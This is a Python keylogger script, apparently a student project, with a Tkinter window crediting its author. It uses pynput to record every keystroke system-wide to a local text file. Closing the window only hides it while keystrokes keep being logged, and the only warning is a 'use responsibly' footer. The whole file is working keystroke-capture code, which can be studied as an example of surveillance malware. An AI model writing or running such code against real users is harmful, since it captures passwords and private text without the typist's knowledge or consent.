import os
import threading
from pynput import keyboard
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk  # pl,tk,pyn install before use 


log_file = ("D:\\AdvanceKeylogger\\key_log.txt")
# to log key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # special 
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

# to stop the listener
def stop_listener():
    global listener
    listener.stop()
    messagebox.showinfo("Info", "Key logging stopped.")
    os._exit(0)  #stop the program

#to hide the window
def hide_window():
    root.withdraw()  # Hide the GUI window

#  to show the window
def show_window():
    root.deiconify()  # Show the GUI window

# Background thread 4 KL
def start_listener():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

# Gui Function
def main():
    global root
    root = tk.Tk()
    root.title("Key Logger by Shaurya Parashar")
    root.geometry("500x400")

    # set bgimg
    bg_image = Image.open("D:\\AdvanceKeylogger\\img.jpg")  # Replace 'background.jpg' with your image file
    bg_image = bg_image.resize((500, 400), Image.Resampling.LANCZOS)
    bg_photo = ImageTk.PhotoImage(bg_image)
    bg_label = tk.Label(root, image=bg_photo)
    bg_label.place(relwidth=1, relheight=1)  # Cover the entire window

    # Create a title label
    title_label = tk.Label(
        root,
        text="Key Logger",
        font=("Helvetica", 28, "bold"),
        bg="#000000",  # Semi-transparent black for better readability
        fg="#E94560"
    )
    title_label.pack(pady=20)

    dev_label = tk.Label(
        root,
        text="Developed by: Shaurya Parashar",
        font=("Helvetica", 16, "italic"),
        bg="#000000",  # Semi-transparent black
        fg="#F5F5F5"
    )
    dev_label.pack(pady=5)

    detail_label = tk.Label(
        root,
        text="B.Tech CSE, 5th Semester, Graphic Era University",
        font=("Helvetica", 10),
        bg="#000000",  # Semi-transparent black
        fg="#A1D6E2"
    )
    detail_label.pack(pady=5)

    status_label = tk.Label(
        root,
        text="Logging keystrokes...",
        font=("Helvetica", 16),
        bg="#000000",  
        fg="#A1D6E2"
    )
    status_label.pack(pady=10)

    stop_button = tk.Button(
        root,
        text="Stop Logging",
        command=stop_listener,
        font=("Helvetica", 16),
        bg="#FF6F61",
        fg="#FFFFFF",
        activebackground="#D64550",
        width=20
    )
    stop_button.pack(pady=20)

    
    footer_label = tk.Label(
        root,
        text="Use responsibly. Unauthorized use is prohibited.",
        font=("Helvetica", 12),
        bg="#000000",  
        fg="#CCCCCC"
    )
    footer_label.pack(side="bottom", pady=10)

    
    root.protocol("WM_DELETE_WINDOW", hide_window)  # Prevent closing the program
    root.mainloop()


if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    main()
